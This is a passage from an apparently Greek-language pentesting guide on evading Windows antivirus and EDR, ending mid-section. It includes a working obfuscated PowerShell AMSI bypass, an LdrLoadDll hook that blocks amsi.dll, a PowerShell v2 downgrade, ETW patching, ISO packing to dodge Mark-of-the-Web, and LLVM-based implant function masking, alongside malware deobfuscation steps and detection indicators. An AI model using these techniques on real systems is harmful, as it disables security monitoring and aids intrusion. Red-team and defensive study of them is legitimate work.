Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Να έχετε υπόψη ότι αυτή η ανάρτηση πιθανότατα θα επισημανθεί μόλις δημοσιευτεί, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν σκοπεύετε να παραμείνετε απαρατήρητοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Έτσι, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Για μια πιο λεπτομερή εξήγηση, διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

### Αποκλεισμός του AMSI αποτρέποντας τη φόρτωση του amsi.dll (hook στο LdrLoadDll)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική, ανεξάρτητη από τη γλώσσα παράκαμψη είναι η τοποθέτηση ενός hook σε user mode στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη λειτουργική μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και custom loaders (με οτιδήποτε θα φόρτωνε διαφορετικά το AMSI).
- Συνδυάστε το με την αποστολή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, το οποίο αποφεύγει τον εντοπισμό από signatures χρησιμοποιώντας τυχαιοποιημένα user-defined functions, μεταβλητές και εκφράσεις χαρακτήρων, ενώ εφαρμόζει τυχαία κεφαλαιοποίηση στους όρους του PowerShell για να αποφύγει τον εντοπισμό από signatures.

**Αφαίρεση του εντοπισμένου signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και το **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το εντοπισμένο AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για το AMSI signature και, στη συνέχεια, αντικαθιστώντας το με εντολές NOP, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή του PowerShell είναι μια λειτουργία που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποιήστε το PowerShell Transcription και το Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρησιμοποιήστε την έκδοση 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρησιμοποιήστε μια μη διαχειριζόμενη συνεδρία PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει ελέγχους που σχετίζονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί από μόνο του το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ενδεχομένως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Αποσυσκότιση .NET Binaries που προστατεύονται από το ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντάτε πολλά επίπεδα προστασίας που εμποδίζουν decompilers και sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο στη συνέχεια μπορεί να αποσυμπιεστεί σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης, τροποποιεί το PE checksum, ώστε οποιαδήποτε αλλαγή να προκαλέσει crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα κλειδιά XOR και να δημιουργήσετε ξανά ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να φανούν χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *καθαρό* αρχείο στο **de4dot-cex** (ένα fork του de4dot με υποστήριξη για ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Σημαίες:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και αποκρυπτογραφεί τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy-call – Το ConfuserEx αντικαθιστά τις απευθείας κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*), ώστε να δυσκολέψει περαιτέρω το decompilation.  Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το παραγόμενο binary στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider`, για να εντοπίσετε το *πραγματικό* payload.  Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε σταθμό εργασίας εκτός σύνδεσης.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μονογραμμή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), που ενισχύει την ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από αλλοίωση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, που δημιουργούνται από το framework μεταπρογραμματισμού templates της C++, ώστε να δυσκολέψει λίγο περισσότερο όποιον επιχειρεί να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας obfuscator δυαδικών αρχείων x64, που μπορεί να κάνει obfuscate διάφορα αρχεία PE, όπως .exe, .dll και .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, με χρήση ROP (return-oriented programming). Κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly, μετατρέποντας τις κανονικές εντολές σε αλυσίδες ROP και ανατρέποντας τη φυσική μας αντίληψη για τη συνήθη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### Αυτομάσκαρισμα ανά συνάρτηση με υποβοήθηση του compiler LLVM

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όσο βρίσκεται σε αναμονή, ένα τροποποιημένο backend LLVM X86 μπορεί να διατηρεί επιλεγμένες συναρτήσεις με XOR-mask όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό μηχανικό κώδικα και εκπέμπει έναν κοινό handler masking στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η σύμβαση κλήσης Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά την επιλογή εντολών και τη βελτιστοποίηση, καθώς ο μετασχηματισμός πρέπει να καλύπτει **κάθε εκπεμπόμενη εντολή επιστροφής** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει την τελευταία `MachineInstr::isReturn()`, τη διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο επισυναπτόμενο επίλογο και αντικαθιστά τις προηγούμενες εντολές επιστροφής με `JMP_1 handler`. Διατηρήστε οποιαδήποτε αποδόμηση στοίβας/frame που δημιουργεί ο compiler πριν από κάθε επιστροφή· ανακατευθύνετε μόνο την ίδια την εντολή επιστροφής.<sup>[[38]](#references)[[39]](#references)</sup>

Οι `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ η `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που μοιράζονται μεταξύ των σταδίων εκπομπής επιτρέπουν σε ένα branch του prologue να στοχεύσει τον μεταγενέστερο επίλογό του· για ένα χειροκίνητα εκπεμπόμενο near `je`, γράψτε `0F 84` και έπειτα την τετρα-byte MC έκφραση `target - address_after_je`. Οι κλήσεις και τα άλματα προς τον handler μπορούν αντί γι’ αυτό να εκπέμπονται ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση, όταν δεν έκανε καμία αλλαγή· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα κλειδί XOR και εγγραφές 16 byte, οι οποίες περιέχουν έναν δείκτη συνάρτησης που έχει υποστεί relocation από τον loader και ένα μήκος χρόνου εκτέλεσης, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στη θέση `+8` της εγγραφής, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές ανά `0x10`. Τα ονόματα των PE section έχουν μήκος μόνο οκτώ byte, επομένως η αναζήτηση χρόνου εκτέλεσης βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει στο stub το παλιό RVA του entry point και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub παίρνει τη βάση της εικόνας από το `gs:[0x60]` → `[PEB+0x10]`, διασχίζει τα imports του PE32+ για να εντοπίσει μια ήδη εισαγόμενη `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση θέτει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση metadata. Το μόνιμα αναγνώσιμο prologue καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παρακάμπτει το σώμα που παραμένει ακόμη clear. Στη συνέχεια, ο επίλογος χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` bytes), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της συνάρτησης που μετασχηματίστηκε, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata της. Το stub εκκαθαρίζει το sentinel και μεταπηδά στη διεύθυνση `ImageBase + original_entry_point_RVA`, αφού έχουν γίνει masking σε όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στον επισυναπτόμενο επίλογο, ενώ κάθε προηγούμενη επιστροφή μεταπηδά απευθείας στον κοινό handler. Ο κανονικός επίλογος χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε, μετά το εκ νέου masking, το `ret` του handler να καταναλώσει τη διεύθυνση επιστροφής του αρχικού καλούντος και να διατηρήσει το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (σε αυτήν την έκδοση, `0x46` bytes), αλλάζει την υπόλοιπη περιοχή σε `PAGE_EXECUTE_READWRITE`, εκτελεί XOR byte προς byte με το χαμηλό byte του κλειδιού και, στη συνέχεια, τη θέτει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά την κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Ενδείξεις υψηλής διαγνωστικής αξίας για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και ενότητα `.funcmet` που περιέχει κλειδί και relocated δείκτες προς το `.text`·
- ανάλυση των PEB, import table και section table πριν από το CRT, ακολουθούμενη από κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες αλλαγές δικαιωμάτων `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από την εικόνα.

Αυτό αποτελεί αποφυγή memory scanner, όχι κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό clear σώμα, ενώ ένας debugger μπορεί να σταματήσει στη `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, το αναγνώσιμο metadata και το σταθερό όριο `0x46` καθιστούν επίσης εύκολη την ανάκτηση εκτός σύνδεσης.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Οι θέσεις TEB του PoC είναι τοπικές για κάθε thread, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές σε όλη τη διεργασία. Επομένως, η ταυτόχρονη ή αναδρομική είσοδος μπορεί να εναλλάσσει ξανά τις εντολές ενώ εκτελείται άλλη κλήση· οι εξαιρέσεις και οι μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το εκ νέου masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις αλλαγές, να επαναφέρει τα δικαιώματα που επιστράφηκαν μέσω του `lpflOldProtect`, να αποφεύγει τα hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` για ευθυγράμμιση στοίβας x64 και να καλεί `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων bytes. Η Microsoft καθιστά ρητά τον καλούντα υπεύθυνο για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως να έχετε δει αυτήν την οθόνη όταν κατεβάζετε και εκτελείτε ορισμένα εκτελέσιμα αρχεία από το διαδίκτυο.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη: εφαρμογές που δεν κατεβαίνουν συχνά ενεργοποιούν το SmartScreen, το οποίο ειδοποιεί τον τελικό χρήστη και εμποδίζει την εκτέλεση του αρχείου (αν και το αρχείο μπορεί και πάλι να εκτελεστεί πατώντας More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με τη διεύθυνση URL από την οποία έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία που είναι υπογεγραμμένα με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε την προσθήκη Mark of The Web στα payloads σας είναι να τα συσκευάσετε σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου, για την αποφυγή του Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί ένα demo για την παράκαμψη του SmartScreen, με συσκευασία payloads μέσα σε αρχεία ISO μέσω του [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, που επιτρέπει σε εφαρμογές και στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και ανίχνευση κακόβουλων δραστηριοτήτων.

Όπως ακριβώς απενεργοποιείται (παρακάμπτεται) το AMSI, είναι επίσης δυνατό η συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως, χωρίς να καταγράφει συμβάντα. Αυτό γίνεται με την τροποποίηση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Περισσότερες πληροφορίες θα βρείτε στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Ανάκλαση C# Assembly

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο εκτέλεσης των post-exploitation εργαλείων σας χωρίς να εντοπιστείτε από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να μας απασχολήσει μόνο η τροποποίηση του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει **τη δημιουργία μιας νέας αναλώσιμης διεργασίας**, την έγχυση του κακόβουλου post-exploitation κώδικά σας στη νέα διεργασία, την εκτέλεσή του και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά κατά τη διάρκεια της post-exploitation ενέργειάς μας ή εντοπιστεί, υπάρχουν **πολύ περισσότερες πιθανότητες** να **επιβιώσει το implant** μας. Το μειονέκτημα είναι ότι υπάρχουν **περισσότερες πιθανότητες** να εντοπιστείτε από **συμπεριφορικές ανιχνεύσεις**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την έγχυση του κακόβουλου post-exploitation κώδικα **στην ίδια τη διεργασία**. Έτσι, αποφεύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχουν **πολύ περισσότερες πιθανότητες** να **χάσετε το beacon** σας, καθώς η διεργασία μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Επανασυσκευασία εργαλείων .NET σε WebAssembly με NativeAOT (WasmForge)

Οι συνήθεις τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει το υπόστρωμα εκτέλεσης: μεταφέρει ένα C# project στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει το module σε έναν Windows PE host βασισμένο στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, το JIT ή το `dotnet` host του συστήματος-στόχου, οπότε οι κανόνες που βασίζονται μόνο σε ονόματα managed assemblies, στη φόρτωση CLR, στο AMSI ή στο .NET ETW χάνουν την άμεση ορατότητα. Πρόκειται για τεχνική αποφυγής ανίχνευσης/συσκευασίας και όχι για παράκαμψη ορίου δικαιωμάτων — το guest διατηρεί τα αρχικά δικαιώματα και την παρατηρήσιμη συμπεριφορά του εργαλείου στο λειτουργικό σύστημα.<sup>[[44]](#references)[[45]](#references)</sup>

### Δημιουργία C# project

